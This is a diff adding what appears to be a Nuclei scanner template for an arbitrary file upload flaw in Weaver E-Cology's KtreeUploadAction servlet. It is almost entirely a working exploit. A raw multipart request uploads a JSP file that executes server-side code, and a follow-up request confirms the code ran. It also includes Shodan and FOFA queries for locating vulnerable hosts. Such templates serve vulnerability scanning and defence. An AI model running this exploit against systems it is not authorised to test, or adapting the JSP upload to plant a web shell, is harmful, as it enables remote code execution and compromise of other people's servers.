@@ -1,0 +1,61 @@
+id: weaver-ktreeuploadaction-file-upload
+
+info:
+  name: Weaver E-Cology KtreeUploadAction - Arbitrary File Upload
+  author: SleepingBag945
+  severity: critical
+  description: |
+    There is a file upload vulnerability in Weaver E-Cology. An attacker can upload any file through KtreeUploadAction.jsp and further exploit it.
+  reference:
+    - https://buaq.net/go-117479.html
+  classification:
+    cpe: cpe:2.3:a:weaver:e-cology:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 2
+    shodan-query: ecology_JSessionid
+    fofa-query: app="泛微-协同办公OA"
+    product: e-cology
+    vendor: weaver
+  tags: weaver,ecology,fileupload,intrusive,vuln
+
+variables:
+  num1: "{{rand_int(40000, 50000)}}"
+  num2: "{{rand_int(40000, 50000)}}"
+  result: "{{to_number(num1)*to_number(num2)}}"
+
+http:
+  - raw:
+      - |
+        @timeout: 20s
+        POST /weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywgljfvib
+
+        ------WebKitFormBoundarywgljfvib
+        Content-Disposition: form-data; name="test"; filename="{{randstr}}.jsp"
+        Content-Type: image/jpeg
+
+        <%out.print({{num1}} * {{num2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundarywgljfvib--
+      - |
+        @timeout: 20s
+        GET {{filename}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && contains_all(body_1,'original', 'SUCCESS')"
+          - "contains(body_2, '{{result}}') && status_code_2 == 200"
+        condition: and
+
+    extractors:
+      - type: regex
+        name: filename
+        group: 1
+        regex:
+          - "','url':'(.*?)','title"
+        internal: true
+# digest: 4a0a00473045022026257b47616d657de74eccfe969851cd1e84ace737ff18d299df9c4dfc79f9ff022100e066e5ba4027ba2e6109c437b6e3be4d1107f22b72c73911446f6d0edba6bfa8:922c64590222798bb761d5b6d8e72950
